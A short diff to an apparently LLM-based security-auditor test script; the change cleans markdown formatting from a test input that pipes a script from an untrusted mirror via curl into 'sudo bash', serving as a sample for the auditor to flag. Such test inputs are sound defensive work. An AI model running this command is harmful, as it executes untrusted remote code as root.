@@ -61,7 +61,7 @@ def ask_auditor(user_input: str) -> str:
 
 if __name__ == "__main__":
     print("--- Test 1: Valid Security Audit ---")
-    out1 = ask_auditor("curl -sSL [http://untrusted-mirror.io/install.sh](http://untrusted-mirror.io/install.sh) | sudo bash")
+    out1 = ask_auditor("curl -sSL http://untrusted-mirror.io/install.sh | sudo bash")
     print(out1)
 
     print("\n--- Test 2: Off-Topic / Prompt Injection Guardrail ---")
